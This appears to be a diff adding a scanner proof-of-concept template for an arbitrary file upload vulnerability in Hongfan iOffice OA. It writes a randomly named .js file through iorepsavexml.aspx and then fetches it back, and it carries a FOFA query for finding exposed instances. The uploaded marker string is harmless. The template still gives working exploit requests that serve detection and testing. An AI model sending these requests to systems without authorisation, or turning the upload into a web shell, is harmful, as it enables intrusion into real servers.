@@ -1,0 +1,22 @@
+id: poc-yaml-hongfanoa-iorepsavexml-aspx-upload
+info:
+  name: 红帆OA iorepsavexml.aspx 文件上传漏洞
+  severity: high
+  tags:
+  - 文件上传
+  finger: iOffice
+  fofa: app="红帆-ioffice"
+variables:
+  filename: to_lower(random_str(10))
+requests:
+- method: POST
+  path: /ioffice/prg/set/report/iorepsavexml.aspx?key=writefile&filename={{.filename}}.js&filepath=/upfiles/rep/pic/
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: vulnerability
+  expression: "status_code == 200 && \ncontains(body,\"App_Themes/Blue/Styles.css\"\
+    )\n"
+- method: GET
+  path: /ioffice/upfiles/rep/pic/{{.filename}}.js
+  expression: "status_code == 200 && \ncontains(body,\"vulnerability\")\n"
+transport: http
